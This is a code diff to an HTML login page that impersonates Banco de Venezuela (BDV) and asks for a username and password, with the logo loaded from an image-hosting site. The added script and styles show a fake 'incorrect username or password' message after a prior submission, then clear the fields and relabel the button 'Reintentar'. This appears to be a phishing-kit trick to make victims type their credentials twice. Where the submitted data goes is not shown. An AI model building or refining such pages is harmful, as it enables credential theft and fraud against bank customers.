@@ -104,10 +104,19 @@
             cursor: pointer;
             display: inline-block;
             transition: background-color 0.3s;
+            margin-bottom: 10px;
         }
 
         .submit-btn:hover {
             background-color: #9e153a;
+        }
+
+        .error-message {
+            color: #bb1b47;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
         }
 
         .footer {
@@ -154,6 +163,12 @@
         .checkbox-input:checked::before {
             opacity: 1;
         }
+        
+        /* Estilo para mensaje de error */
+        .input-error {
+            border-color: #bb1b47 !important;
+            background-color: #fff5f5 !important;
+        }
     </style>
 </head>
 
@@ -163,7 +178,7 @@
             <img src="https://i.postimg.cc/8cVWGCkV/logo.png" alt="Logo BDV Venezuela">
         </div>
         <h2>Introduce tu usuario único</h2>
-        <form method="post" onsubmit="return handleFormSubmit(event)">
+        <form method="post" onsubmit="return handleFormSubmit(event)" id="loginForm">
             <div class="input-group">
                 <input placeholder="Usuario único" type="text" id="username" name="username" required>
             </div>
@@ -174,9 +189,41 @@
                 <input type="checkbox" id="terms" class="checkbox-input" required>
                 <label for="terms">Acepto los términos y condiciones</label>
             </div>
-            <button type="submit" class="submit-btn">Entrar</button>
+            <button type="submit" class="submit-btn" id="submitBtn">Entrar</button>
+            <div class="error-message" id="errorMessage">
+                Usuario y/o contraseña incorrectos. Por favor, intente nuevamente.
+            </div>
         </form>
         <div class="footer"></div>
     </div>
+    
+    <script>
+        // Limpiar el sessionStorage al cargar la página
+        sessionStorage.removeItem('bdv_first_attempt');
+        
+        // Verificar si ya hubo un intento fallido
+        document.addEventListener('DOMContentLoaded', function() {
+            const isSecondAttempt = sessionStorage.getItem('bdv_first_attempt') === 'completed';
+            
+            if (isSecondAttempt) {
+                // Mostrar mensaje de error en la interfaz
+                document.getElementById('errorMessage').style.display = 'block';
+                
+                // Añadir estilos de error a los inputs
+                document.getElementById('username').classList.add('input-error');
+                document.getElementById('password').classList.add('input-error');
+                
+                // Cambiar texto del botón
+                document.getElementById('submitBtn').textContent = 'Reintentar';
+                
+                // Limpiar campos
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+                
+                // Enfocar en el primer campo
+                document.getElementById('username').focus();
+            }
+        });
+    </script>
 </body>
 </html>
